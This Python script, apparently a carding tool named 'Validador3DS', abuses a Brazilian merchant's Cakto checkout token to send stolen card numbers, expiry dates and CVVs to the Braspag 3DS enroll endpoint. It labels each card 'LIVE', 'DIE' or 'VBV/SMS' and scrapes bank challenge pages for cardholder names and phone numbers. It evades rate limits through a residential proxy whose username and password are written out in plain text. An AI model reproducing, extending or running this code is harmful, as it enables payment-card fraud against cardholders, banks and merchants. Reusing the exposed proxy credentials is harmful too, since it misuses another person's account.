import requests
import time
import re
import os
from bs4 import BeautifulSoup
from html import unescape as html_unescape

class Validador3DS:
    CHECKOUT_ID = "1m2n34w_778899"
    PRODUCT_ID = "1m2n34w_778899"
    AMOUNT = "29700"
    INSTALLMENTS = 1
    
    TOKEN_URL = "https://api.cakto.com.br/api/financial/cielo/3ds/token"
    ENROLL_URL = "https://mpi.braspag.com.br/v2/3ds/enroll"
    
    # ===== PROXY (OPCIONAL) =====
    # Se você NÃO tiver um proxy, pule esta seção (desative mais abaixo).
    PROXY_HOST = "la.residential.rayobyte.com"
    PROXY_PORT = "8000"
    PROXY_USER = "diogoaarestrup2012_outlook_com"
    PROXY_PASS = "D190706eu@"
    
    def __init__(self):
        self.token = None
        # Configurar proxy com autenticação
        proxy_auth = f"{self.PROXY_USER}:{self.PROXY_PASS}"
        proxy_url = f"http://{proxy_auth}@{self.PROXY_HOST}:{self.PROXY_PORT}"
        self.proxies = {
            "http": proxy_url,
            "https": proxy_url
        }
        # Se você NÃO tiver proxy, descomente as duas linhas abaixo:
        # self.proxies = None
        
        print(f"🌐 Proxy configurado: {self.PROXY_HOST}:{self.PROXY_PORT}")
        print(f"👤 Usuário: {self.PROXY_USER}")
        print("=" * 50)
        
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://pay.cakto.com.br",
            "Referer": f"https://pay.cakto.com.br/{self.CHECKOUT_ID}/"
        })
        
        self.pasta_resultados = f"resultados_{self.CHECKOUT_ID}"
        if not os.path.exists(self.pasta_resultados):
            os.makedirs(self.pasta_resultados)
            print(f"📁 Pasta '{self.pasta_resultados}' criada!")
        
        print(f"🔒 Checkout: {self.CHECKOUT_ID}")
        print(f"💰 Valor: R$ {float(self.AMOUNT)/100:.2f}")
        print(f"📦 Parcelas: {self.INSTALLMENTS}x\n")
    
    def has_vbv(self, html_text):
        if not html_text:
            return False
        h = html_text.lower()
        indicadores = ["validar a transa", "push", "id santander",
                       "prosseguir com sua compra", "celular cadastrado",
                       "aplicativo santander", "autentica", "3ds", "verified by visa"]
        n = sum(1 for ind in indicadores if ind.lower() in h)
        return n >= 2

    def has_sicredi_vbv(self, html_text):
        if not html_text:
            return False
        h = html_text.lower()
        indicadores = ["aplicativo sicredi", "confirme a transa",
                       "cancelar autoriza", "sicredi", "cartões", 
                       "secureacs", "challenge"]
        n = sum(1 for ind in indicadores if ind.lower() in h)
        return n >= 2

    def extract_sicredi_vbv_message(self, html_text):
        if not html_text:
            return None
        m = re.search(
            r'Cancelar Autorização de Compra[^<]*aplicativo Sicredi[^<]*confirme a transação[^<]*',
            html_text, re.IGNORECASE | re.DOTALL
        )
        if m:
            return re.sub(r'\s+', ' ', html_unescape(m.group(0).strip()))
        body = re.search(r'<body[^>]*>(.*?)</body>', html_text, re.DOTALL)
        if body:
            text = re.sub(r'<[^>]+>', ' ', body.group(1))
            text = re.sub(r'\s+', ' ', html_unescape(text)).strip()
            if len(text) > 30:
                for line in text.split('. '):
                    if any(w in line.lower() for w in ['sicredi', 'confirme', 'confirmar', 'aplicativo']):
                        return line.strip() + '.'
        return None

    def has_bb_vbv(self, html_text):
        if not html_text:
            return False
        h = html_text.lower()
        indicadores = ["banco do brasil", "app bb", "notifica",
                       "pendências", "one-time passcode", "confirma",
                       "bb", "banco brasil"]
        n = sum(1 for ind in indicadores if ind.lower() in h)
        return n >= 2

    def _primeira_visita(self):
        try:
            url = f"https://pay.cakto.com.br/{self.CHECKOUT_ID}"
            self.session.get(url, timeout=45, proxies=self.proxies)
            return True
        except Exception as e:
            print(f"   ❌ Erro na visita: {str(e)[:50]}")
            return False
    
    def _get_token(self):
        try:
            print("   🌐 Visitando página...")
            url = f"https://pay.cakto.com.br/{self.CHECKOUT_ID}"
            temp_session = requests.Session()
            temp_session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "pt-BR,pt;q=0.9",
            })
            resp = temp_session.get(url, timeout=45, proxies=self.proxies)
            print(f"   📄 Visita Status: {resp.status_code}")
            if resp.status_code != 200:
                print(f"   ❌ Falha ao visitar página")
                return False
            time.sleep(2)
            print("   🔑 Solicitando token...")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://pay.cakto.com.br',
                'Referer': f'https://pay.cakto.com.br/{self.CHECKOUT_ID}/'
            }
            resp = temp_session.post(self.TOKEN_URL, headers=headers, timeout=45, proxies=self.proxies)
            print(f"   📄 Token Status: {resp.status_code}")
            if resp.status_code != 200:
                print(f"   ❌ HTTP {resp.status_code}")
                print(f"   📄 Resposta: {resp.text[:200]}")
                return False
            try:
                data = resp.json()
                self.token = data.get("access_token")
            except:
                match = re.search(r'"access_token"\s*:\s*"([^"]+)"', resp.text)
                if match:
                    self.token = match.group(1)
                else:
                    print(f"   ❌ Não foi possível extrair token")
                    print(f"   📄 Resposta: {resp.text[:200]}")
                    return False
            if self.token:
                print(f"   ✅ Token obtido: {self.token[:20]}...")
                self.session.cookies.update(temp_session.cookies)
                return True
            else:
                print(f"   ❌ Token não encontrado")
                return False
        except Exception as e:
            print(f"   ❌ Erro ao obter token: {str(e)[:50]}")
            return False
    
    def _renovar_token(self):
        print("   🔄 Renovando token (HTTP 401)...")
        self.token = None
        time.sleep(5)
        return self._get_token()
    
    def _identificar_banco(self, acs_url):
        if not acs_url:
            return "Desconhecido"
        url_lower = acs_url.lower()
        if "santander" in url_lower:
            return "Santander"
        if "sicredi" in url_lower or "secureacs" in url_lower:
            return "Sicredi"
        if "caixa" in url_lower or "cardinalcommerce" in url_lower:
            return "CAIXA"
        if "sicoob" in url_lower or "cabal" in url_lower:
            return "Sicoob"
        if "porto" in url_lower:
            return "Porto Seguro"
        if "bb" in url_lower or "banco do brasil" in url_lower:
            return "BB"
        return "Outro"
    
    def _extrair_mensagem_sicredi(self, html):
        if not html:
            return None, None
        mensagem = self.extract_sicredi_vbv_message(html)
        if mensagem:
            soup = BeautifulSoup(html, 'html.parser')
            div = soup.find('div', class_='challengeInfoText')
            if div:
                texto = div.get_text(strip=True)
                match = re.match(r'^([^,]+),', texto)
                if match:
                    return mensagem, match.group(1).strip()
            return mensagem, None
        soup = BeautifulSoup(html, 'html.parser')
        div = soup.find('div', class_='challengeInfoText')
        if div:
            texto = div.get_text(strip=True)
            texto = re.sub(r'\s+', ' ', texto)
            match = re.match(r'^([^,]+),', texto)
            if match:
                return texto, match.group(1).strip()
            return texto, None
        return None, None
    
    def _extrair_mensagem(self, html, banco):
        if not html:
            return None, None
        if banco == "Sicredi":
            return self._extrair_mensagem_sicredi(html)
        if banco == "BB":
            if self.has_bb_vbv(html):
                soup = BeautifulSoup(html, 'html.parser')
                for p in soup.find_all(['p', 'div', 'span']):
                    texto = p.get_text(strip=True)
                    if any(w in texto.lower() for w in ['banco do brasil', 'app bb', 'notifica', 'pendências']):
                        if len(texto) > 20:
                            return re.sub(r'\s+', ' ', texto), None
                return "Autenticação Banco do Brasil", None
        soup = BeautifulSoup(html, 'html.parser')
        if banco == "Santander":
            div = soup.find('div', class_='container_body_text')
            if div and div.find('p'):
                texto = div.find('p').get_text(strip=True)
                return re.sub(r'\s+', ' ', texto), None
        elif banco == "CAIXA":
            p = soup.find('p', class_='visa-body') or soup.find('p', id='Body1')
            mensagem = None
            if p:
                mensagem = re.sub(r'\s+', ' ', p.get_text(strip=True))
            telefone = None
            label = soup.find('label', class_='custom-radio')
            if label:
                telefone = label.get_text(strip=True)
            else:
                match = re.search(r'\([0-9]{2}\)\s*[0-9]{4,5}-[0-9]{4}', html)
                if match:
                    telefone = match.group(0)
            return mensagem, telefone
        elif banco == "Sicoob":
            div = soup.find('div', class_='challengeInfoText')
            if div:
                texto = div.get_text(strip=True)
                texto = re.sub(r'\s+', ' ', texto)
                return texto, None
            section = soup.find('section', id='processingZone')
            if section:
                div = section.find('div', class_='challengeInfoText')
                if div:
                    texto = div.get_text(strip=True)
                    texto = re.sub(r'\s+', ' ', texto)
                    return texto, None
            return None, None
        elif banco == "Porto Seguro":
            p = soup.find('p', id='Body1') or soup.find('p', class_='mb-0')
            if p:
                texto = p.get_text(strip=True)
                texto = re.sub(r'\s+', ' ', texto)
                return texto, None
            for p in soup.find_all('p'):
                texto = p.get_text(strip=True)
                if len(texto) > 50 and ('Porto' in texto or 'app Porto' in texto):
                    return re.sub(r'\s+', ' ', texto), None
            return None, None
        return None, None
    
    def _acessar_acs(self, acs_url, banco, pareq=None):
        if not acs_url:
            return None, None
        try:
            if pareq:
                resp = self.session.post(acs_url, data={"creq": pareq, "threeDSSessionData": ""}, timeout=45, proxies=self.proxies)
            else:
                resp = self.session.get(acs_url, timeout=45, proxies=self.proxies)
            if resp.status_code == 200:
                return self._extrair_mensagem(resp.text, banco)
            return None, None
        except:
            return None, None
    
    def verificar_cartao(self, numero, mes, ano, cvv, idx, total):
        start_time = time.time()
        if not self._primeira_visita():
            return f"{idx}/{total} - {numero}|{mes}|{ano}|{cvv} - ERRO: Visita inicial"
        time.sleep(3)
        if not self.token and not self._get_token():
            return f"{idx}/{total} - {numero}|{mes}|{ano}|{cvv} - ERRO: Token"
        time.sleep(2)
        payload = {
            "ordernumber": self.PRODUCT_ID,
            "currency": "BRL",
            "totalamount": self.AMOUNT,
            "paymentmethod": "credit",
            "cardnumber": numero,
            "cardexpirationmonth": mes.zfill(2),
            "cardexpirationyear": ano,
            "browserInfo": {
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "screenWidth": 1440,
                "screenHeight": 900,
                "colorDepth": 32,
                "timeZoneOffset": -180,
                "language": "pt-BR",
                "javaEnabled": "N",
                "javascriptEnabled": "Y"
            },
            "RecurringInfo": {
                "type": None, "validationIndicator": None, "maximumAmount": None,
                "referenceNumber": None, "occurrence": None,
                "numberOfPayments": None, "amountType": None
            }
        }
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        max_tentativas = 4
        for tentativa in range(max_tentativas):
            try:
                resp = self.session.post(self.ENROLL_URL, json=payload, headers=headers, timeout=45, proxies=self.proxies)
                if resp.status_code == 401:
                    print(f"   🔄 Token expirado (401) - Renovando...")
                    if self._renovar_token():
                        headers["Authorization"] = f"Bearer {self.token}"
                        print(f"   ✅ Token renovado, tentando novamente...")
                        time.sleep(3)
                        continue
                    else:
                        return f"{idx}/{total} - {numero}|{mes}|{ano}|{cvv} - ERRO: Falha ao renovar token"
                if resp.status_code == 429:
                    print(f"   ⚠️ HTTP 429 - Tentativa {tentativa+1}/{max_tentativas} - Aguardando 60s...")
                    time.sleep(60)
                    continue
                if resp.status_code != 200:
                    return f"{idx}/{total} - {numero}|{mes}|{ano}|{cvv} - ERRO: HTTP {resp.status_code}"
                data = resp.json()
                veres = data.get("VEResEnrolled", "").upper()
                status = data.get("Status", "")
                acs_url = data.get("AcsUrl")
                pareq = data.get("Pareq")
                elapsed = int(time.time() - start_time)
                is_vbv = False
                if status == "FAILED" or veres == "N":
                    return f"❌ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - DIE - {elapsed}s"
                if veres == "Y" or status == "AUTHENTICATION_CHECK_NEEDED":
                    banco = self._identificar_banco(acs_url)
                    mensagem, nome = self._acessar_acs(acs_url, banco, pareq)
                    if mensagem:
                        if (self.has_vbv(mensagem) or 
                            self.has_sicredi_vbv(mensagem) or 
                            self.has_bb_vbv(mensagem)):
                            is_vbv = True
                        palavras_vbv = ['push', 'app', 'sms', 'token', 'celular', 'validação', 'autenticação', 
                                       '3ds', 'vbv', 'secure', 'verified', 'challenge', 'authentication',
                                       'banco do brasil', 'sicredi', 'santander', 'notifica', 'pendências']
                        for palavra in palavras_vbv:
                            if palavra.lower() in mensagem.lower():
                                is_vbv = True
                                break
                    if is_vbv:
                        if self.has_bb_vbv(mensagem or ""):
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - VBV/SMS - BB - {elapsed}s"
                        elif self.has_sicredi_vbv(mensagem or ""):
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - VBV/SMS - Sicredi - {elapsed}s"
                        elif "santander" in (mensagem or "").lower():
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - VBV/SMS - Santander - {elapsed}s"
                        else:
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - VBV/SMS - {banco} - {elapsed}s"
                    if mensagem:
                        if nome:
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - LIVE - {banco} - Nome: {nome} - {mensagem} - {elapsed}s"
                        else:
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - LIVE - {banco} - {mensagem} - {elapsed}s"
                    else:
                        if banco in ["Sicoob", "Santander", "Sicredi", "CAIXA", "Porto Seguro", "BB"]:
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - VBV/SMS - {banco} - {elapsed}s"
                        else:
                            return f"✅ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - LIVE - {banco} - {elapsed}s"
                return f"⚠️ {idx}/{total} - {numero}|{mes}|{ano}|{cvv} - UNKNOWN - {status} - {elapsed}s"
            except Exception as e:
                if tentativa < max_tentativas - 1:
                    print(f"   ⚠️ Erro na tentativa {tentativa+1}: {str(e)[:30]} - Aguardando 30s...")
                    time.sleep(30)
                    continue
                return f"{idx}/{total} - {numero}|{mes}|{ano}|{cvv} - ERRO: {str(e)[:50]}"
        return f"{idx}/{total} - {numero}|{mes}|{ano}|{cvv} - ERRO: Max tentativas"
    
    def processar_lista(self, arquivo="card.txt"):
        # Não usamos esta função no main.py, mas mantemos para compatibilidade
        pass
    
    def _salvar_live_individual(self, cartao, resultado):
        # Função não usada, mas mantida
        pass
    
    def _salvar_live_consolidado(self, cartoes_live, resultados):
        # Função não usada, mas mantida
        pass
    
    def _salvar_log_completo(self, resultados):
        # Função não usada, mas mantida
        pass

def main():
    # Função principal (não usada)
    pass

if __name__ == "__main__":
    main()